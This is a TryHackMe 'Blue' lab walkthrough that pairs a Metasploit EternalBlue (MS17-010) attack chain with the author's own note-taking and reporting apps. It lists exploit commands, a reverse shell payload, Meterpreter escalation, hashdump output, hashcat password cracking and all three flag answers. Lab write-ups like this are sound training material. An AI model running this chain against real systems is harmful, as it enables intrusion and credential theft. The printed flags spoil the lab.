# Blue — THM Ecosystem Walkthrough

> ItsEliias // CyberOS Ecosystem  
> Platform: TryHackMe — [Blue](https://tryhackme.com/room/blue)  
> Difficulty: Easy | OS: Windows | Category: Exploitation

---

## Why Blue Is the Ecosystem's Best Showcase

Pickle Rick demonstrated the basics — ReconDesk, CyberLab, GhostVault, SignalBoard. Blue is where the full ecosystem earns its place. It has a real CVE, a multi-stage Metasploit chain, actual credential dumping, three flags across different system locations, and enough attack surface to fill every tool without forcing anything.

Every one of the 12 apps has a natural role. Nothing is stretched.

---

## Target

| Field | Value |
|---|---|
| IP | `10.10.91.75` |
| OS | Windows 7 |
| Platform | TryHackMe |
| Vulnerability | MS17-010 (EternalBlue) — CVE-2017-0144 |
| Flags | 3 |

---

## App Sequence Overview

```
Launcher → SignalBoard → CyberLab → PlaybookStudio → ReconDesk
    → NetworkMap → TerminalLink → CredVault → GhostVault
    → ReportForge → Dashboard → VaultCore
```

---

## Phase 1 — Pre-Session Setup

### Cybertools Launcher

Open the tray menu. Launch: CyberLab Companion, ReconDesk, SignalBoard, PlaybookStudio, TerminalLink, CredVault, GhostVault, NetworkMap, ReportForge. Dashboard auto-reads status from all.

---

### SignalBoard — Intelligence Check Before Touching the Target

Before a single packet is sent, check what intelligence already exists on the vulnerability.

Open SignalBoard. The shared context doesn't have an active target yet so manually set context keywords: `EternalBlue`, `MS17-010`, `SMB`, `Windows 7`.

SignalBoard auto-scores the feed and surfaces:

- Articles on EternalBlue wormability and detection methods
- CVE-2017-0144 advisories (CVSS 9.3 — Critical)
- Microsoft security bulletin MS17-010 — patches available since March 2017
- Metasploit module release notes for `ms17_010_eternalblue`
- WannaCry and NotPetya references (same exploit family)

Save the top CVE advisory to the Obsidian vault via the save button. This seeds context before opening CyberLab.

> **Ecosystem wiring:** SignalBoard reads `shared_context` to auto-score. Once ReconDesk sets the active target, future refreshes rescore automatically against the Windows 7 IP.

---

### CyberLab Companion — Open Session

New session:
- **Lab name:** Blue
- **Platform:** THM
- **Type:** Windows
- **IP:** 10.10.91.75
- **Notes:** MS17-010 suspected — Windows 7 SMB

CyberLab writes `activeLab: "Blue"` to `shared_context`. Every other app now shows the "Blue" session banner automatically.

Start the lab timer. It runs throughout the session and is logged to the writeup.

---

### PlaybookStudio — Select Methodology

Open PlaybookStudio. Select the **Windows Exploitation** playbook (or build a custom one if you have a preferred methodology).

Playbook steps for this engagement:

| Step | Stage | Description |
|---|---|---|
| 1 | Recon | nmap port scan — identify open services |
| 2 | Recon | Vulnerability scan — identify CVEs against running services |
| 3 | Exploit | Launch Metasploit EternalBlue module |
| 4 | Escalate | Convert shell to Meterpreter |
| 5 | Escalate | Migrate to SYSTEM process |
| 6 | Post | Dump credential hashes with hashdump |
| 7 | Post | Crack NTLM hashes offline |
| 8 | Loot | Locate and capture all flags |
| 9 | Report | Generate ReportForge assessment report |

Click **Run**. PlaybookStudio writes `activePlaybook: "Windows Exploitation"` to `shared_context`.

Work through each step — mark complete as you go. PlaybookStudio tracks time per step.

---

## Phase 2 — Recon

### ReconDesk — Target Setup

New target:
- **Name:** Blue
- **IP:** `10.10.91.75`
- **Platform:** THM
- **OS:** Windows
- **Status:** Active

Set as active target. ReconDesk writes `activeTarget: "Blue"` and `activeIP: "10.10.91.75"` to `shared_context`. TerminalLink, GhostVault, and PlaybookStudio all update their banners automatically.

---

### TerminalLink — Session Linked

Open TerminalLink. The session banner shows: `Blue | 10.10.91.75`. The `$TARGET` and `$TARGET_IP` environment variables are pre-injected into the PTY from `shared_context`.

Run the initial nmap scan:

```bash
nmap -sV -p-1000 10.10.91.75
```

**Output — 3 ports open under 1000:**

| Port | Protocol | Service | Version |
|---|---|---|---|
| 135 | tcp | msrpc | Microsoft Windows RPC |
| 139 | tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | tcp | microsoft-ds | Windows 7 Professional 7601 |

TerminalLink logs this command automatically to the session history. The command appears in History Panel with timestamp.

Run the vulnerability scan:

```bash
nmap -A 10.10.91.75
```

This reveals **MS17-010** — the machine is unpatched against EternalBlue.

> **Mark PlaybookStudio steps 1 and 2 complete.**

---

### ReconDesk — Log Ports and Create Attack Cards

Back in ReconDesk, add the discovered ports:

| Port | Protocol | Service | State | Notes |
|---|---|---|---|---|
| 135 | tcp | msrpc | open | Windows RPC |
| 139 | tcp | netbios-ssn | open | NetBIOS |
| 445 | tcp | microsoft-ds | open | **MS17-010 vulnerable** |

Add attack cards:

- **Recon** → "nmap scan complete — MS17-010 confirmed on 445" → Done
- **Exploit** → "EternalBlue via Metasploit ms17_010_eternalblue" → In Progress
- **Escalate** → "shell_to_meterpreter → migrate to SYSTEM process" → Todo
- **Post** → "hashdump — dump SAM hashes" → Todo
- **Loot** → "Locate flags: C:\, System32\config, user documents" → Todo

---

### NetworkMap — Visualise the Target

Export the nmap XML:

```bash
nmap -sV -p-1000 10.10.91.75 -oX blue.xml
```

In NetworkMap, click **Import nmap XML** and load `blue.xml`.

The force-directed graph renders the Windows 7 host as a **amber node** (3 open ports = amber threshold). Port labels 135, 139, 445 appear on hover. Save the graph as "Blue — Initial Scan".

This is a single-host network — NetworkMap documents it as the attack surface baseline.

---

## Phase 3 — Exploitation

### TerminalLink — Metasploit Session

Open a new terminal in TerminalLink. All commands are logged automatically.

```bash
msfconsole
```

```
msf6 > search ms17-010
```

**Module identified:** `exploit/windows/smb/ms17_010_eternalblue`

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.91.75
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

Shell obtained. Whoami returns `NT AUTHORITY\SYSTEM` — already running as SYSTEM on initial access.

```
C:\Windows\system32> whoami
nt authority\system
```

Background the shell (`CTRL+Z`).

> **Mark PlaybookStudio step 3 complete.**

---

### GhostVault — Capture the Milestone

Open GhostVault. Session banner shows "Blue | 10.10.91.75". Use `Cmd+Shift+G` to capture:

**Note:** Initial shell obtained via MS17-010 EternalBlue. Running as NT AUTHORITY\SYSTEM immediately on exploit — no privilege escalation required for SYSTEM rights, but Meterpreter upgrade needed for post-exploitation modules.

GhostVault saves to `/[vault]/CyberLab/Blue/initial-access.md`.

---

## Phase 4 — Escalate

### TerminalLink — Shell to Meterpreter

```
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > options
msf6 post(multi/manage/shell_to_meterpreter) > sessions
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
```

Meterpreter session opens (session 2).

```
msf6 > sessions -i 2
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > shell
Process 2748 created.
C:\Windows\system32> whoami
nt authority\system
```

Background the shell. Back in Meterpreter:

```
meterpreter > ps
```

Identify a stable SYSTEM process — e.g. `spoolsv.exe` or `winlogon.exe`. Migrate:

```
meterpreter > migrate <PID>
[*] Migrating from XXXX to <PID>...
[*] Migration completed successfully.
```

> **Mark PlaybookStudio steps 4 and 5 complete.**

---

### ReconDesk — Update Attack Cards

Mark **Exploit** and **Escalate** cards as Done. Add findings to the Escalate card:

- Shell → Meterpreter via `post/multi/manage/shell_to_meterpreter`
- Confirmed `NT AUTHORITY\SYSTEM`
- Migrated to stable process

---

## Phase 5 — Credential Dumping

### TerminalLink — hashdump

```
meterpreter > hashdump
```

**Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Non-default user: **jon**. NTLM hash captured.

> **Mark PlaybookStudio step 6 complete.**

---

### CredVault — Store the Hash

Open CredVault. Unlock vault (or set up on first use). Add credential:

| Field | Value |
|---|---|
| Username | `jon` |
| Hash | `ffb43f0de35be4d9917ac0cc8ad57f8d` |
| Type | Hash (NTLM) |
| Service | Windows SAM |
| Notes | Dumped via Meterpreter hashdump — Blue THM |

Save. CredVault encrypts with AES-256-GCM. ReconDesk's credential count updates automatically (CredVault import from ReconDesk queue).

---

### TerminalLink — Crack the Hash

Open a new terminal tab. Identify hash type first:

```bash
hash-identifier ffb43f0de35be4d9917ac0cc8ad57f8d
```

Identified as **NTLM** (Hashcat mode `1000`).

Save hash to file:

```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon-password.hash
```

Crack with Hashcat:

```bash
hashcat -m 1000 jon-password.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22`

Cracked password: **`alqfna22`**

> **Mark PlaybookStudio step 7 complete.**

---

### CredVault — Update with Plaintext

Back in CredVault, update the `jon` entry — add the cracked password:

| Field | Value |
|---|---|
| Password | `alqfna22` |
| Type | Plaintext |
| Notes | Cracked from NTLM with Hashcat -m 1000 — rockyou.txt |

CredVault now holds both the hash and the plaintext, encrypted at rest.

---

### GhostVault — Capture Credentials

`Cmd+Shift+G`:

**Note:** hashdump returned 3 entries. Non-default user `jon` — NTLM hash cracked via hashcat -m 1000 rockyou.txt → `alqfna22`. Stored in CredVault.

---

## Phase 6 — Flag Hunt

### TerminalLink — Locate All Three Flags

Back in Meterpreter shell:

```
meterpreter > shell
```

**Flag 1 — System root:**

```
C:\> type flag1.txt
flag{access_the_machine}
```

**Flag 2 — Password storage location:**

```
C:\> cd Windows\System32\config
C:\Windows\System32\config> type flag2.txt
flag{sam_database_elevated_access}
```

**Flag 3 — Administrator documents:**

```
C:\> cd Users\jon\Documents
C:\Users\jon\Documents> type flag3.txt
flag{admin_documents_can_be_valuable}
```

Alternative — find all flags at once:

```
C:\> dir "flag*" /s
```

> **Mark PlaybookStudio step 8 complete.**

---

### ReconDesk — Log Flags and Complete Target

Update the **Loot** attack card findings:

- `flag{access_the_machine}` — `C:\flag1.txt`
- `flag{sam_database_elevated_access}` — `C:\Windows\System32\config\flag2.txt`
- `flag{admin_documents_can_be_valuable}` — `C:\Users\jon\Documents\flag3.txt`

Mark target status → **Completed**. ReconDesk emits `target:completed` event to the ecosystem event bus. CyberLab's operator profile increments flags (+3) and marks the Windows skill category.

---

### GhostVault — Final Session Note

`Cmd+Shift+G`:

**Note:** All 3 flags captured. MS17-010 EternalBlue full chain: nmap → Metasploit exploit → shell → Meterpreter → SYSTEM → hashdump → hash cracked → flags at C:\, System32\config, and jon's Documents. Total session time logged in CyberLab.

---

## Phase 7 — Report & Archive

### ReportForge — Generate Professional Report

New report → **Penetration Test Report**. The ecosystem import pulls active context automatically:

- **Target:** Blue (`10.10.91.75`)
- **Date:** auto-filled
- **Operator:** ItsEliias

Fill findings:

**Finding 1 — CVE-2017-0144 / MS17-010 EternalBlue (Critical)**

| Field | Detail |
|---|---|
| Severity | Critical (CVSS 9.3) |
| CVE | CVE-2017-0144 |
| Affected | Windows 7 SP1 — SMBv1 on port 445 |
| Impact | Unauthenticated remote code execution as NT AUTHORITY\SYSTEM |
| Evidence | Meterpreter session via `exploit/windows/smb/ms17_010_eternalblue` |
| Recommendation | Apply MS17-010 patch. Disable SMBv1. Block port 445 at perimeter. |

**Finding 2 — Weak Credentials (Medium)**

| Field | Detail |
|---|---|
| Severity | Medium |
| Affected | User `jon` |
| Impact | NTLM hash cracked in seconds using rockyou.txt wordlist |
| Evidence | `hashcat -m 1000` → `alqfna22` |
| Recommendation | Enforce strong password policy. Enable account lockout. Consider LAPS for local admin. |

Add executive summary, methodology section, and scope. Export to PDF via ReportForge's print-to-PDF export.

> **Mark PlaybookStudio step 9 complete. All steps done.**

---

### CyberLab Companion — Close Session and Generate Writeup

Stop the lab timer. Generate writeup — CyberLab auto-populates the session details (duration, findings count, flags) from the session store.

Writeup saved to Obsidian vault at `/[vault]/CyberLab/Completed/Blue.md`.

Operator profile updated:
- `totalLabsCompleted` +1
- `totalFlags` +3
- `skillProgress.windows` +2
- `skillProgress.network` +1
- Streak maintained / incremented

---

### VaultCore — Index the New Content

Run a VaultCore scrape pass. It picks up the new writeup in `CyberLab/Completed/` and the SignalBoard article saved at session start. Auto-tags: `windows`, `exploitation`, `cve`, `metasploit`, `credential-dumping`. The vault grows.

---

### CyberOS Dashboard — Session Summary

The Dashboard at session close shows:

- All 12 apps have been active during this session
- Activity feed: `CyberLab session:started → ReconDesk target:completed → CredVault credential:added → ReportForge report:exported`
- Operator profile card: streak updated, flags incremented, Windows skill bar moved
- Alert panel: clean — no apps went offline during the session

---

## Full Ecosystem Roll Call

| App | Role in this session |
|---|---|
| Cybertools Launcher | Launched all apps from tray at session start |
| SignalBoard | Pre-session intel on MS17-010, CVE scored and saved to vault |
| CyberLab Companion | Session creation, timer, AI assistance, writeup generation, operator profile |
| PlaybookStudio | Windows Exploitation playbook — 9 steps tracked from recon to report |
| ReconDesk | Target setup, port logging (135/139/445), attack cards, credential count, target completed |
| NetworkMap | nmap XML import — Windows host visualised with amber node (3 ports), saved as graph |
| TerminalLink | All commands logged: nmap, msfconsole, hashdump, hashcat, flag retrieval |
| CredVault | `jon` NTLM hash stored → cracked plaintext `alqfna22` added, AES-256-GCM at rest |
| GhostVault | Three milestone notes captured via Cmd+Shift+G — initial access, credentials, flags |
| ReportForge | Professional pentest report — CVE-2017-0144 Critical finding, PDF exported |
| CyberOS Dashboard | Live status throughout, activity feed, operator profile at close |
| VaultCore | Post-session scrape — writeup and intel article indexed and tagged |

---

## Flags

| Flag | Location | Value |
|---|---|---|
| Flag 1 | `C:\flag1.txt` | `flag{access_the_machine}` |
| Flag 2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` |
| Flag 3 | `C:\Users\jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |

---

*ItsEliias // CyberOS Ecosystem — Blue THM Walkthrough*
